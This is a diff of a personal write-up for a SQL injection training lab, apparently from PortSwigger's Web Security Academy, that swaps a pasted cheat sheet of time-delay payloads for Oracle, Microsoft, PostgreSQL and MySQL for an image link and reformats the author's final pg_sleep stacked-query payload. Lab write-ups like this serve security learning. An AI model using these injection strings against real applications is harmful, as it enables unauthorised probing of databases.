@@ -14,20 +14,12 @@ To solve the lab, exploit the SQL injection vulnerability to cause a 10 second d
 ---
 
 ### My solution:
-
 I followed this cheatsheet and tried them one by one, shaping them to fit my payload, because I didn't know which database the server used.
 
-Conditional time delays
-
-You can test a single boolean condition and trigger a time delay if the condition is true.
-
-Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
-
-Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
-
-PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
-
-MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+<img width="1414" height="454" alt="image" src="https://github.com/user-attachments/assets/70323ac0-9c68-4317-abff-2cbbf84b00f6" />
+<sup>Source: https://portswigger.net/web-security/sql-injection/cheat-sheet</sup>
+<br><br>
 
 I ended up with this:
-`'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (I encoded it in URL before injecting)
+```sql
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (I encoded it in URL before injecting)
